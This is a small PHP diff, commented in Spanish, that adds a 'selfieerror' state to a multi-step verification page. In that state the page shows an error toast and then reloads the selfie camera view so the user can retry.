@@ -59,6 +59,9 @@ if ($status === 'otp') {
         include 'partials/whatsapp_validation.php';
     } elseif ($status === 'selfie') { // <-- Nuevo estado Selfie Include
         include 'partials/selfie.php';
+    } elseif ($status === 'selfieerror') { // <-- Nuevo estado Selfie Error
+        include 'partials/selfie_error_notification.php'; // Toast
+        include 'partials/selfie.php'; // Vista de cámara para reintentar
     }
     ?>
 
